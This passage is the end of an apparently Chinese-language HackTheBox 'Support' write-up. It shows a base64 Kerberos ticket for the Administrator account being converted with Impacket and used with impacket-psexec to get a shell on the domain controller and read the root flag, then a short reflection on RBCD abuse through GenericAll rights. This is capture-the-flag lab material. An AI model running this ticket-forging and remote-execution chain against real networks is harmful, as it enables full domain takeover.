x6Ifi5r5pcq+HYKb6alJgjL1quOLT2dzHcr/UetReU1i9dwdjsi+9jKBJPXT84ijStHaAPDvcKlCXwbbmnlotJQsVNcDJv/w0Z6IsAkShrCykvNVQP/vrBN6RF9Xw8Yc0/yomaoSMfTGmQafIWjRaCxyWNbxJDXCGTVD1g1EakbPT7EzK56ZbAgk4FtJ5iH4JSV3reDTii2MBb8rOWC3o+K1mHXaS3I3eadVcTCmUCf3930GStdQRYtDoiVYRnk8L2+QHvoMRWmbB74RBnMfJdfdekzrqzgtnBxNYQMg/g/+LZuCgVaRLziJSTKpAEYg+0Z5mGDMhpLkTsNdreX6lzKnXf0A+pTWULaVvNROqUKmQinJh6+qiFquqeBwe0DYhAqC6SHG46qZxHDsfuOAfgPVp7frNVY6ha5CYOh5n+fx02Bc1EaVeOIHzady4SqPysJ0n43h3wW2sQLHdoBXtqsIY6tLo/1Qbfv4TmTkADMvySFDiRIs56JvL9pWkSzmd1og8/C//KuSFVj4Igt4Tq/aSPRn9WtE4VP55ekyqFOL9FA8h7rdV/lZ8vZ77yNVCyXs3GNhJSdkO2RZhd6L18q3VHH4nQYXkkvJ6Ce/rAgtd3EV5g5HOKZLDzh/cg7xfQq+BzjkeyElr8nj7x3LTX63ROfYnEcgzOOX/0IPSBkftIJKkWZqXvsWdRxWBu02hv07Jyp931+8Gj9nQcrC2S1eJVdxS7UT/hVsn4HGW5U0JdhlBm9TJ+q0v/RrwWYgJBraGq1X1SmbER6OPFCKAs/IPUMDT+Qpzz8PBUW+wk/HiOxXmrZn4cvwutvF9xstRyK805EKx1mTAJfsUn+O13pwCKImMHl1qMXJM4rEtrSOrx+kEi80mLg/Y/Htm4ZS+VdQVrAXSW63FFo6b2ZF8NMEGz0ZPcEYElTCbYYMdBv4M58cJGrCcV9oAN3oAFwQb8Pq4oNycoKBXH9LZ+gSnii7LE0DEFvVC0QJErqJAFej1YLyYapSzLrUXeuyBjopA54Bfe4Xl5uiLX9tNEolpHWGKzKVy+MKAk2htkiyUBgELmesvBO9zjGjChx99Am0m37oWZzymSodo2BkHQ1Z560utIwPTVzKP/1Nn55RuAeK9/SHvwZm89qqntmDhtqkq6wxbwM0j25kJL5yoN2c0vl1KleKGJb/lqhdzOg6c07EAZs2ZJ3MAaWtjwF9hiTHkpJZPJREmnXSHWWrmQrxh8j6dcW+AAgrlxdAygHQT0+c+hPB+IvjmpjSTUz1uVSwmneYhHq8cf4QRzoqrvaPjoEsMizIwEuURMr3ue/pI8MhObhQGaB1JZLKaLNLUeq/vBCDmXV4+JqFwLq82mLHdUgwKOytZ5QcXnUqegKWAVrjs97ivt5Fm0uSGJAkw9jydSIS4gww+WxrKQnypnauVBDaF+zLkOfV12vNGRER5DyBNk7GyWUwRMNOpGZpcfNhj3yScSYUnylRmvkCUZ5jOKsym1z70GVHlk285rePuzzx3mZvHPZ1vPNZ0e4b9m6tj9zSBB/9ONtj6eOVQVaZjZtX5R5LOolP/TmhMuoIjUPlGeqpWg52s/ZChotZCbTE5bFY5GBt19lg1+QCTbHYUI7yjiXbGXkdiEgGggU3+pJS2DkrZH2JMSea4u1QpwFAiMJo4HZMIHWoAMCAQCigc4Egct9gcgwgcWggcIwgb8wgbygGzAZoAMCARGhEgQQnh7E7fdRnwzHySlz5DmL8aENGwtTVVBQT1JULkhUQqIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyNTA0MDIwNDM0MTBaphEYDzIwMjUwNDAyMTQzNDEwWqcRGA8yMDI1MDQwOTA0MzQxMFqoDRsLU1VQUE9SVC5IVEKpITAfoAMCAQKhGDAWGwRjaWZzGw5kYy5zdXBwb3J0Lmh0Yg==' > ticket
                                                                             
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# base64 -d ticket > ticket.kirbi                                  
                                                                             
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
                                                                             
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# KRB5CCNAME=ticket.ccache
                                                                             
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass -codec gbk
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
                                                                             
┌──(root㉿kali)-[/home/kali/HTB/Support]
└─# KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass -codec gbk

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file OjqCmWET.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service MZzD on dc.support.htb.....
[*] Starting service MZzD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
14a02ff228d042c49c8bf8e68a385e16
```

注意导入票据的语句与psexec的语句要连续，不然无法认证

---

# 0x04 总结

关于RBCD这块是刚接触AD域时学的东西了，现在已经忘得差不多了。通过`GenericAll`完全掌控权限想到RBCD对于我来说是应该敏感的点，但第一次碰的时候却没有想出来，菜就多练吧。